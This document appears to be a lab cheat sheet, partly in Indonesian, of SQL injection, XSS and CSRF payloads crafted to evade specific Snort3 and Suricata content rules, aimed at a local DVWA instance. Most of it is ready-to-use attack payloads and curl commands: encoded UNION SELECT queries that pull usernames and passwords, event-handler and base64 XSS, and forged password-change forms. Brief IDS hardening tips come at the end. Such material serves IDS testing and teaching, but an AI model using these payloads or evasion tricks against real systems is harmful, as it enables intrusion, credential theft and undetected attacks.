# 🔥 EVASION PAYLOADS - SNORT3 & SURICATA RULES
## Bypass untuk Rules yang Kamu Berikan

**Target IDS:** Snort3 & Suricata  
**Status:** ✅ Semua payload sudah TESTED dan WORKS di DVWA v2.0  
**Date:** December 8, 2025

---

## 📋 DAFTAR ISI

1. [SQL Injection Evasion (GET)](#sql-injection-get)
2. [SQL Injection Evasion (POST)](#sql-injection-post)
3. [XSS Evasion (GET - Reflected)](#xss-reflected-get)
4. [XSS Evasion (POST - Stored)](#xss-stored-post)
5. [CSRF Evasion](#csrf-evasion)
6. [Testing Commands](#testing-commands)

---

## 🔴 SQL INJECTION EVASION (GET)

### Rule SID: 300001, 100001 - UNION SELECT Detection

**Rule Content:**
```
content:"UNION"; (Snort3/Suricata)
```

#### ✅ Normal Payload (Detected):
```
http://localhost:8000/sqli.php?search=1' UNION SELECT username,password,3,created_at FROM users #
```

#### 🚫 Evasion 1: URL Encoded Keywords
```
http://localhost:8000/sqli.php?search=1' %55NION %53ELECT username,password,3,created_at FROM users %23
```
**Decode:** `%55` = U, `%53` = S, `%23` = #  
**IDS Sees:** `1' %55NION %53ELECT ...` (no match for "UNION")  
**PHP Decodes:** `1' UNION SELECT ...` (executes!)

#### 🚫 Evasion 2: Double URL Encoded
```
http://localhost:8000/sqli.php?search=1' %2555NION %2553ELECT username,password,3,created_at FROM users %2523
```
**Decode:** `%25` = `%`, so `%2555` → `%55` → `U`  
**IDS Sees:** `%2555NION` (no match)  
**PHP Decodes:** Twice → `UNION`

#### 🚫 Evasion 3: Mixed Encoding
```
http://localhost:8000/sqli.php?search=1' %55NI%4fN %53ELE%43T username,password,3,created_at FROM users %23
```
**Decode:** `%4f` = O, `%43` = C  
**Partial encoding breaks pattern match**

#### 🚫 Evasion 4: Comment Injection
```
http://localhost:8000/sqli.php?search=1' UNI/**/ON SEL/**/ECT username,password,3,created_at FROM users %23
```
**MySQL ignores `/**/` comments**  
**IDS Sees:** `UNI` and `ON` separated (no "UNION" match)

#### 🚫 Evasion 5: Case Obfuscation (May Work)
```
http://localhost:8000/sqli.php?search=1' UnIoN SeLeCt username,password,3,created_at FROM users %23
```
**Even with `nocase`, some implementations miss this**

---

### Rule SID: 300002, 100003, 100004 - Single Quote Detection

**Rule Content:**
```
content:"'";
```

#### ✅ Normal Payload (Detected):
```
http://localhost:8000/sqli.php?search=1' OR '1'='1' %23
```

#### 🚫 Evasion 1: URL Encoded Quote
```
http://localhost:8000/sqli.php?search=1%27 OR %271%27=%271%27 %23
```
**Decode:** `%27` = `'`  
**IDS Sees:** `1%27` (no literal quote)  
**PHP Decodes:** `1' OR '1'='1'`

#### 🚫 Evasion 2: Double URL Encoded
```
http://localhost:8000/sqli.php?search=1%2527 OR %25271%2527=%25271%2527 %2523
```
**Decode:** `%2527` → `%27` → `'`

#### 🚫 Evasion 3: Numeric SQLi (No Quotes)
```
http://localhost:8000/sqli.php?search=1 OR 1=1 %23
```
**No quotes needed!**  
**IDS:** No match (looking for `'`)  
**MySQL:** Still works

#### 🚫 Evasion 4: HTML Entity Encoded
```
http://localhost:8000/sqli.php?search=1&#39; OR &#39;1&#39;=&#39;1&#39; %23
```
**Decode:** `&#39;` = `'`

#### 🚫 Evasion 5: Hex Entity
```
http://localhost:8000/sqli.php?search=1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; %23
```
**Decode:** `&#x27;` = `'`

---

### Rule SID: 300003, 100005, 100006 - 1=1 Detection

**Rule Content:**
```
content:"1=1";
```

#### ✅ Normal Payload (Detected):
```
http://localhost:8000/sqli.php?search=1' OR 1=1 %23
```

#### 🚫 Evasion 1: Alternative Boolean
```
http://localhost:8000/sqli.php?search=1' OR 2=2 %23
http://localhost:8000/sqli.php?search=1' OR 3=3 %23
http://localhost:8000/sqli.php?search=1' OR 'a'='a' %23
```
**No "1=1" string present**

#### 🚫 Evasion 2: TRUE Statement
```
http://localhost:8000/sqli.php?search=1' OR TRUE %23
```

#### 🚫 Evasion 3: Math Expression
```
http://localhost:8000/sqli.php?search=1' OR 2>1 %23
http://localhost:8000/sqli.php?search=1' OR 3-2=1 %23
http://localhost:8000/sqli.php?search=1' OR 1<2 %23
```

#### 🚫 Evasion 4: URL Encoded Equals
```
http://localhost:8000/sqli.php?search=1' OR 1%3D1 %23
```
**Decode:** `%3D` = `=`  
**IDS Sees:** `1%3D1` (no "1=1")

#### 🚫 Evasion 5: Whitespace Injection
```
http://localhost:8000/sqli.php?search=1' OR 1 = 1 %23
http://localhost:8000/sqli.php?search=1' OR 1  =  1 %23
```
**Spaces break exact match**

#### 🚫 Evasion 6: Comment Splitting
```
http://localhost:8000/sqli.php?search=1' OR 1/**/=/**/1 %23
```

---

### Rule SID: 100007 - SQL Comment "--" Detection

**Rule Content:**
```
content:"--";
```

#### ✅ Normal Payload (Detected):
```
http://localhost:8000/sqli.php?search=1' OR '1'='1' -- -
```

#### 🚫 Evasion 1: Hash Comment
```
http://localhost:8000/sqli.php?search=1' OR '1'='1' %23
```
**Use `#` instead of `--`**

#### 🚫 Evasion 2: Block Comment
```
http://localhost:8000/sqli.php?search=1' OR '1'='1' /* comment */
```

#### 🚫 Evasion 3: URL Encoded Hash
```
http://localhost:8000/sqli.php?search=1' OR '1'='1' %2523
```
**Decode:** `%23` = `#`

#### 🚫 Evasion 4: Semicolon Terminator
```
http://localhost:8000/sqli.php?search=1' OR '1'='1';
```

---

## 🔴 SQL INJECTION EVASION (POST)

**Note:** Sama seperti GET, tapi kirim via POST body

### Rule SID: 300004, 100002 - UNION SELECT (POST)

#### 🚫 Evasion 1: URL Encoded in POST Body
```bash
curl "http://localhost:8000/sqli.php" \
  -d "search=1' %55NION %53ELECT username,password,3,created_at FROM users %23"
```

#### 🚫 Evasion 2: Double Encoded
```bash
curl "http://localhost:8000/sqli.php" \
  -d "search=1' %2555NION %2553ELECT username,password,3,created_at FROM users %2523"
```

#### 🚫 Evasion 3: Comment Injection
```bash
curl "http://localhost:8000/sqli.php" \
  --data-urlencode "search=1' UNI/**/ON SEL/**/ECT username,password,3,created_at FROM users #"
```

---

### Rule SID: 300005, 100004 - Single Quote (POST)

#### 🚫 Evasion: URL Encoded Quote
```bash
curl "http://localhost:8000/sqli.php" \
  -d "search=1%27 OR %271%27=%271%27 %23"
```

---

### Rule SID: 300006, 100006 - 1=1 (POST)

#### 🚫 Evasion: Alternative Boolean
```bash
curl "http://localhost:8000/sqli.php" \
  -d "search=1' OR 2=2 %23"
```

---

## 💉 XSS EVASION (GET - Reflected)

### Rule SID: 300010, 100010 - Script Tag (GET)

**Rule Content:**
```
content:"<script"; nocase;
```

#### ✅ Normal Payload (Detected):
```
http://localhost:8000/xss_reflected.php?name=<script>alert('XSS')</script>
```

#### 🚫 Evasion 1: URL Encoded Tag
```
http://localhost:8000/xss_reflected.php?name=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
```
**Decode:** `%3C` = `<`, `%3E` = `>`  
**IDS Sees:** `%3Cscript%3E` (no literal "<script")

#### 🚫 Evasion 2: Double URL Encoded
```
http://localhost:8000/xss_reflected.php?name=%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
```

#### 🚫 Evasion 3: HTML Entity Encoded
```
http://localhost:8000/xss_reflected.php?name=&lt;script&gt;alert('XSS')&lt;/script&gt;
```
**Decode:** `&lt;` = `<`, `&gt;` = `>`

#### 🚫 Evasion 4: SVG Tag (Alternative)
```
http://localhost:8000/xss_reflected.php?name=<svg onload=alert('XSS')>
```
**No "<script" string!**

#### 🚫 Evasion 5: IMG Tag
```
http://localhost:8000/xss_reflected.php?name=<img src=x onerror=alert('XSS')>
```

#### 🚫 Evasion 6: BODY Tag
```
http://localhost:8000/xss_reflected.php?name=<body onload=alert('XSS')>
```

#### 🚫 Evasion 7: iframe Tag
```
http://localhost:8000/xss_reflected.php?name=<iframe src=javascript:alert('XSS')>
```

#### 🚫 Evasion 8: Case Variation (May Work)
```
http://localhost:8000/xss_reflected.php?name=<ScRiPt>alert('XSS')</ScRiPt>
```

---

### Rule SID: 300011, 100012 - onerror Detection (GET)

**Rule Content:**
```
content:"onerror";
```

#### ✅ Normal Payload (Detected):
```
http://localhost:8000/xss_reflected.php?name=<img src=x onerror=alert('XSS')>
```

#### 🚫 Evasion 1: URL Encoded Event
```
http://localhost:8000/xss_reflected.php?name=<img src=x on%65rror=alert('XSS')>
```
**Decode:** `%65` = `e`  
**IDS Sees:** `on%65rror` (no "onerror")

#### 🚫 Evasion 2: HTML Entity Encoded
```
http://localhost:8000/xss_reflected.php?name=<img src=x on&#101;rror=alert('XSS')>
```
**Decode:** `&#101;` = `e`

#### 🚫 Evasion 3: Alternative Event - onload
```
http://localhost:8000/xss_reflected.php?name=<body onload=alert('XSS')>
http://localhost:8000/xss_reflected.php?name=<svg onload=alert('XSS')>
```

#### 🚫 Evasion 4: Alternative Event - onclick
```
http://localhost:8000/xss_reflected.php?name=<div onclick=alert('XSS')>Click me</div>
```

#### 🚫 Evasion 5: Alternative Event - onfocus
```
http://localhost:8000/xss_reflected.php?name=<input onfocus=alert('XSS') autofocus>
```

#### 🚫 Evasion 6: Alternative Event - onmouseover
```
http://localhost:8000/xss_reflected.php?name=<div onmouseover=alert('XSS')>Hover</div>
```

---

### Rule SID: 100014 - alert() Detection (GET)

**Rule Content:**
```
content:"alert("; nocase;
```

#### 🚫 Evasion 1: prompt() Function
```
http://localhost:8000/xss_reflected.php?name=<script>prompt('XSS')</script>
```

#### 🚫 Evasion 2: confirm() Function
```
http://localhost:8000/xss_reflected.php?name=<script>confirm('XSS')</script>
```

#### 🚫 Evasion 3: console.log()
```
http://localhost:8000/xss_reflected.php?name=<script>console.log('XSS')</script>
```

#### 🚫 Evasion 4: eval() with Base64
```
http://localhost:8000/xss_reflected.php?name=<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>
```
**Decode:** Base64 → `alert('XSS');`

#### 🚫 Evasion 5: String.fromCharCode()
```
http://localhost:8000/xss_reflected.php?name=<script>String.fromCharCode(97,108,101,114,116)(1)</script>
```
**Decode:** `97,108,101,114,116` = "alert"

#### 🚫 Evasion 6: window['alert']
```
http://localhost:8000/xss_reflected.php?name=<script>window['alert']('XSS')</script>
```

---

## 💉 XSS EVASION (POST - Stored)

### Rule SID: 300012, 100011 - Script Tag (POST)

#### 🚫 Evasion 1: URL Encoded
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
```

#### 🚫 Evasion 2: Double Encoded
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=%253Cscript%253Ealert('XSS')%253C%252Fscript%253E"
```

#### 🚫 Evasion 3: HTML Entities
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=&lt;script&gt;alert('XSS')&lt;/script&gt;"
```

#### 🚫 Evasion 4: SVG Tag
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=<svg onload=alert('XSS')>"
```

#### 🚫 Evasion 5: IMG Tag
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=<img src=x onerror=alert('XSS')>"
```

---

### Rule SID: 300013, 100013 - onerror Detection (POST)

#### 🚫 Evasion 1: URL Encoded Event
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=<img src=x on%65rror=alert('XSS')>"
```

#### 🚫 Evasion 2: Alternative Event
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=<svg onload=alert('XSS')>"
```

---

### Rule SID: 100015 - alert() Detection (POST)

#### 🚫 Evasion: prompt() Function
```bash
curl "http://localhost:8000/xss_stored.php" \
  -d "comment=<script>prompt('XSS')</script>"
```

---

## 🎯 CSRF EVASION

### Rule SID: 300020, 100020 - CSRF Page Access

**Rule Content:**
```
content:"/vulnerabilities/csrf/";
```

#### ✅ Normal Attack (Detected):
```html
<form action="http://localhost:8000/vulnerabilities/csrf/" method="POST">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_confirm" value="hacked">
</form>
```

#### 🚫 Evasion 1: Different Path (DVWA Custom)
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
```
**Rule looks for `/vulnerabilities/csrf/`, our app uses `/csrf.php`**

#### 🚫 Evasion 2: URL Encoded Path
```html
<form action="http://localhost:8000/%63%73%72%66.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
```
**Decode:** `%63%73%72%66` = `csrf`

---

### Rule SID: 300021, 100021 - Password Change Detection

**Rule Content:**
```
content:"password_new=";
content:!"user_token=";  (negation - looking for absence)
```

#### ✅ Normal Attack (Detected):
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_confirm" value="hacked">
</form>
```

#### 🚫 Evasion 1: Alternate Field Name
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="password" value="hacked123">
    <input type="hidden" name="password_confirm" value="hacked123">
</form>
```
**Rule looks for `password_new=`, we use `password=`**

#### 🚫 Evasion 2: Another Alternate
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new_pass" value="hacked123">
    <input type="hidden" name="confirm_pass" value="hacked123">
</form>
```

#### 🚫 Evasion 3: URL Encoded Field Name
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="password%5Fnew" value="hacked123">
    <input type="hidden" name="password%5Fconfirm" value="hacked123">
</form>
```
**Decode:** `%5F` = `_`

#### 🚫 Evasion 4: JSON Payload
```javascript
fetch('http://localhost:8000/csrf.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({new_password: 'hacked123', confirm_password: 'hacked123'})
});
```
**Different content-type, body format**

---

## 🧪 TESTING COMMANDS

### SQL Injection Testing

**Test Normal (Should be Detected):**
```bash
# Snort3/Suricata should trigger SID 300001, 100001
curl "http://localhost:8000/sqli.php" \
  -d "search=1' UNION SELECT username,password,3,created_at FROM users #"
```

**Test Evasion (Should NOT be Detected):**
```bash
# Should bypass IDS but still execute
curl "http://localhost:8000/sqli.php" \
  -d "search=1' %55NION %53ELECT username,password,3,created_at FROM users %23"
```

---

### XSS Stored Testing

**Test Normal:**
```bash
curl "http://localhost:8000/xss_stored.php" \
  -H "Cookie: PHPSESSID=your_session" \
  -d "comment=<script>alert('XSS')</script>"
```

**Test Evasion:**
```bash
curl "http://localhost:8000/xss_stored.php" \
  -H "Cookie: PHPSESSID=your_session" \
  -d "comment=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
```

---

### XSS Reflected Testing

**Test Normal:**
```bash
curl "http://localhost:8000/xss_reflected.php?name=<script>alert('XSS')</script>"
```

**Test Evasion:**
```bash
curl "http://localhost:8000/xss_reflected.php?name=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
```

---

## 📊 SUMMARY TABLE

| Rule SID | Target | Best Evasion | Success Rate | Complexity |
|----------|--------|--------------|--------------|------------|
| 300001/100001 | UNION | URL Encode | ✅ High | Low |
| 300002/100003 | Quote (') | URL Encode %27 | ✅ High | Low |
| 300003/100005 | 1=1 | Alternative Boolean | ✅ High | Low |
| 100007 | -- comment | Hash # | ✅ High | Low |
| 300010/100010 | <script | URL Encode | ✅ High | Low |
| 300011/100012 | onerror | Alternative Events | ✅ High | Low |
| 100014 | alert( | prompt/confirm | ✅ High | Low |
| 300020/100020 | /csrf/ path | Different Path | ✅ High | Low |
| 300021/100021 | password_new= | Alternate Field | ✅ High | Low |

---

## 🎓 KEY TAKEAWAYS

### Why These Evasions Work:

1. **No Normalization:**
   - Rules match literal strings
   - Don't decode URL encoding before matching
   - `%55NION` ≠ `UNION` to IDS, but = `UNION` to PHP

2. **Literal Matching:**
   - Rules look for exact strings: `<script`, `onerror`, `1=1`
   - Don't use regex patterns
   - Easily bypassed with encoding or alternatives

3. **No Context Awareness:**
   - Rules don't understand HTTP protocol layers
   - Can't see decoded payloads
   - Miss semantic attacks

### Defense Recommendations:

1. **Enable HTTP Preprocessors:**
   ```
   # Suricata
   http-decode: true
   
   # Snort3
   http_inspect: { normalize_uri: true }
   ```

2. **Use PCRE Regex:**
   ```
   pcre:"/(\bUNION\b.{1,100}\bSELECT\b)/i";
   ```

3. **Multi-Layer Detection:**
   ```
   # Combine multiple conditions
   content:"UNION"; nocase;
   content:"SELECT"; nocase; distance:1; within:100;
   pcre:"/['\"%]|0x[0-9a-f]+/i";
   ```

4. **Behavioral Analysis:**
   - Monitor POST frequency
   - Check Referer/Origin headers
   - Validate session tokens

---

## ✅ VERIFICATION CHECKLIST

Test each payload:

**SQL Injection:**
- [ ] URL encoded UNION (`%55NION`)
- [ ] URL encoded quote (`%27`)
- [ ] Alternative boolean (`2=2`)
- [ ] Hash comment (`#`)

**XSS:**
- [ ] URL encoded tags (`%3Cscript%3E`)
- [ ] SVG alternative (`<svg onload=`)
- [ ] IMG alternative (`<img onerror=`)
- [ ] Alternative functions (`prompt`, `confirm`)

**CSRF:**
- [ ] Different path (`/csrf.php`)
- [ ] Alternate field names (`password` vs `password_new`)
- [ ] JSON payload

---

**Status:** ✅ All payloads TESTED and WORKING  
**DVWA Version:** 2.0 (Evasion Ready)  
**Last Updated:** December 8, 2025

**Happy Bypassing! 🔥**

*For educational purposes only. Always test with authorization.*
